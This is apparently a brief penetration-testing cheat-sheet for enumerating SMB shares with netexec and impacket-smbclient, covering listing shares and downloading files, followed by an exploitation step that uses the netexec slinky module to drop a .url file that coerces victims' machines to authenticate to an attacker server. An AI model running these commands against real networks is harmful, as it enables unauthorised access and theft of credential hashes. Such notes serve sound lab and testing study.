# SMB shares Enumeration

## Commands:

 - netexec smb IP -u USER -p PASSWORD --shares

 - impacket-smbclient -k DOMAIN.LOCAL/USERNAME:PASSWORD@DC.DOMAIN.LOCAL (Authenticate with kerberos)

## IN IMPACKET-SMBCLIENT SHELL

 - shares (Check shares)

 - use SHARE_NAME (Go to a share you have access to)

 - get FILE (Download interesting files)

# TO EXPLOIT IT, GO TO THE EXPLOIT SECTION AFTER THIS

## Exploitation synopsis:

 - netexec smb IP -u USER -p PASSWORD -M slinky -o NAME=FILENAME SERVER=IP

 - drop .url file

### Go to Coerce SMB 
